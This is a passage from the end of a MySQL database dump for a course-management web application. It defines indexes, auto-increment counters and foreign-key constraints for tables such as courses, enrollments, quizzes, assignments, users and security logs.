  ADD UNIQUE KEY `unique_course_doctor` (`course_id`,`doctor_id`),
  ADD KEY `doctor_id` (`doctor_id`);

--
-- Indexes for table `course_enrollments`
--
ALTER TABLE `course_enrollments`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_enrollment` (`course_id`,`student_id`),
  ADD KEY `student_id` (`student_id`);

--
-- Indexes for table `course_tas`
--
ALTER TABLE `course_tas`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_course_ta` (`course_id`,`ta_id`),
  ADD KEY `ta_id` (`ta_id`),
  ADD KEY `assigned_by` (`assigned_by`);

--
-- Indexes for table `csrf_tokens`
--
ALTER TABLE `csrf_tokens`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`),
  ADD KEY `published_by` (`published_by`);

--
-- Indexes for table `notifications`
--
ALTER TABLE `notifications`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `questions`
--
ALTER TABLE `questions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `quiz_id` (`quiz_id`);

--
-- Indexes for table `question_options`
--
ALTER TABLE `question_options`
  ADD PRIMARY KEY (`id`),
  ADD KEY `question_id` (`question_id`);

--
-- Indexes for table `quizzes`
--
ALTER TABLE `quizzes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `course_id` (`course_id`),
  ADD KEY `created_by` (`created_by`);

--
-- Indexes for table `quiz_answers`
--
ALTER TABLE `quiz_answers`
  ADD PRIMARY KEY (`id`),
  ADD KEY `attempt_id` (`attempt_id`),
  ADD KEY `question_id` (`question_id`);

--
-- Indexes for table `quiz_attempts`
--
ALTER TABLE `quiz_attempts`
  ADD PRIMARY KEY (`id`),
  ADD KEY `quiz_id` (`quiz_id`),
  ADD KEY `student_id` (`student_id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `role_name` (`role_name`);

--
-- Indexes for table `security_logs`
--
ALTER TABLE `security_logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `idx_security_logs_created_at` (`created_at`),
  ADD KEY `idx_security_logs_attack_type` (`attack_type`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`),
  ADD UNIQUE KEY `email` (`email`),
  ADD KEY `role_id` (`role_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `activity_logs`
--
ALTER TABLE `activity_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=51;

--
-- AUTO_INCREMENT for table `assignments`
--
ALTER TABLE `assignments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `assignment_files`
--
ALTER TABLE `assignment_files`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `assignment_submissions`
--
ALTER TABLE `assignment_submissions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `courses`
--
ALTER TABLE `courses`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `course_doctors`
--
ALTER TABLE `course_doctors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `course_enrollments`
--
ALTER TABLE `course_enrollments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `course_tas`
--
ALTER TABLE `course_tas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `csrf_tokens`
--
ALTER TABLE `csrf_tokens`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `news`
--
ALTER TABLE `news`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `notifications`
--
ALTER TABLE `notifications`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT for table `questions`
--
ALTER TABLE `questions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `question_options`
--
ALTER TABLE `question_options`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `quizzes`
--
ALTER TABLE `quizzes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `quiz_answers`
--
ALTER TABLE `quiz_answers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=11;

--
-- AUTO_INCREMENT for table `quiz_attempts`
--
ALTER TABLE `quiz_attempts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `security_logs`
--
ALTER TABLE `security_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=29;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `activity_logs`
--
ALTER TABLE `activity_logs`
  ADD CONSTRAINT `activity_logs_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `assignments`
--
ALTER TABLE `assignments`
  ADD CONSTRAINT `assignments_ibfk_1` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `assignments_ibfk_2` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `assignment_files`
--
ALTER TABLE `assignment_files`
  ADD CONSTRAINT `assignment_files_ibfk_1` FOREIGN KEY (`assignment_id`) REFERENCES `assignments` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `assignment_files_ibfk_2` FOREIGN KEY (`uploaded_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `assignment_submissions`
--
ALTER TABLE `assignment_submissions`
  ADD CONSTRAINT `assignment_submissions_ibfk_1` FOREIGN KEY (`assignment_id`) REFERENCES `assignments` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `assignment_submissions_ibfk_2` FOREIGN KEY (`student_id`) REFERENCES `users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `assignment_submissions_ibfk_3` FOREIGN KEY (`graded_by`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `courses`
--
ALTER TABLE `courses`
  ADD CONSTRAINT `courses_ibfk_1` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `course_doctors`
--
ALTER TABLE `course_doctors`
  ADD CONSTRAINT `course_doctors_ibfk_1` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `course_doctors_ibfk_2` FOREIGN KEY (`doctor_id`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `course_enrollments`
--
ALTER TABLE `course_enrollments`
  ADD CONSTRAINT `course_enrollments_ibfk_1` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `course_enrollments_ibfk_2` FOREIGN KEY (`student_id`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `course_tas`
--
ALTER TABLE `course_tas`
  ADD CONSTRAINT `course_tas_ibfk_1` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `course_tas_ibfk_2` FOREIGN KEY (`ta_id`) REFERENCES `users` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `course_tas_ibfk_3` FOREIGN KEY (`assigned_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `news`
--
ALTER TABLE `news`
  ADD CONSTRAINT `news_ibfk_1` FOREIGN KEY (`published_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `questions`
--
ALTER TABLE `questions`
  ADD CONSTRAINT `questions_ibfk_1` FOREIGN KEY (`quiz_id`) REFERENCES `quizzes` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `question_options`
--
ALTER TABLE `question_options`
  ADD CONSTRAINT `question_options_ibfk_1` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `quizzes`
--
ALTER TABLE `quizzes`
  ADD CONSTRAINT `quizzes_ibfk_1` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `quizzes_ibfk_2` FOREIGN KEY (`created_by`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `quiz_answers`
--
ALTER TABLE `quiz_answers`
  ADD CONSTRAINT `quiz_answers_ibfk_1` FOREIGN KEY (`attempt_id`) REFERENCES `quiz_attempts` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `quiz_answers_ibfk_2` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `quiz_attempts`
--
ALTER TABLE `quiz_attempts`
  ADD CONSTRAINT `quiz_attempts_ibfk_1` FOREIGN KEY (`quiz_id`) REFERENCES `quizzes` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `quiz_attempts_ibfk_2` FOREIGN KEY (`student_id`) REFERENCES `users` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `security_logs`
--
ALTER TABLE `security_logs`
  ADD CONSTRAINT `security_logs_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL;

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_ibfk_1` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
